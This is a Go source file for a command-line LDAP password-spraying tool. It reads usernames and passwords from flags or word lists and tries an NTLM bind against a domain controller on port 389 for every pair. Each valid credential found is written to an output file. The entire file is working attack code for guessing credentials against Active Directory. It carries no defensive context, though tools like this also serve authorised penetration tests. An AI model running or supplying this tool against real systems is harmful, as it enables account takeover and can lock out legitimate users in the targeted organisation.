package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/go-ldap/ldap/v3"
	"github.com/gosuri/uilive"
)

var (
	ldapServer string
	ldapUser   string
	ldapPass   string
	ldapDomain string

	ldapUserFile string
	ldapPassFile string

	outFile string
)

func main() {
	flag.StringVar(&ldapDomain, "d", "", "Domain")
	flag.StringVar(&ldapUser, "u", "", "Single username")
	flag.StringVar(&ldapPass, "p", "", "Single password")
	flag.StringVar(&ldapServer, "s", "", "LDAP Server")
	flag.StringVar(&ldapUserFile, "U", "", "Users.txt file")
	flag.StringVar(&ldapPassFile, "P", "", "Password.txt file")
	flag.StringVar(&outFile, "f", "success.txt", "Output file")

	flag.Parse()

	if len(ldapDomain) < 1 {
		fmt.Println("Domain target is missing, try using -d <domain>")
		return
	}

	if ldapServer == "" {
		ldapServer = ldapDomain
	}

	listUser := []string{}
	listPass := []string{}

	if len(ldapUser) > 0 {
		listUser = append(listUser, ldapUser)
	}

	if len(ldapPass) > 0 {
		listPass = append(listPass, ldapPass)
	}

	if len(ldapUserFile) > 0 {
		lines, err := file2Lines(ldapUserFile)
		if err != nil {
			panic(err)
		}
		listUser = append(listUser, lines...)
	}

	if len(ldapPassFile) > 0 {
		lines, err := file2Lines(ldapPassFile)
		if err != nil {
			panic(err)
		}
		listPass = append(listPass, lines...)
	}

	if len(listUser) < 1 {
		fmt.Println("User is missing, try using -u <user>")
		return
	}

	if len(listPass) < 1 {
		fmt.Println("Password is missing, try using -p <password>")
		return
	}

	conn, err := ldap.DialURL("ldap://" + ldapServer + ":389")
	if err != nil {
		panic(err)
	}

	writer := uilive.New()
	writer.Start()
	total := len(listPass) * len(listUser)
	counter := 0
	f, err := os.OpenFile(outFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		panic(err)
	}
	defer f.Close()

	if _, err := f.WriteString(fmt.Sprintf("===== %s =====\n", time.Now().Format("2006-01-02 15:04:05"))); err != nil {
		log.Panic(err)
	}

	for _, p := range listPass {
		for _, u := range listUser {
			counter++
			req := &ldap.NTLMBindRequest{
				Domain:   ldapDomain,
				Username: u,
				Password: p,
			}
			fmt.Fprintf(writer, "Check... (%d/%d) %s\n", counter, total, p)

			_, err = conn.NTLMChallengeBind(req)
			if err == nil {
				if _, err := f.WriteString(fmt.Sprintf("[+] %s:%s\n", u, p)); err != nil {
					log.Println(err)
				}
			}
		}
	}

	writer.Stop()
}

func file2Lines(f string) ([]string, error) {
	var lines []string
	file, err := os.Open(f)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}
	return lines, err
}
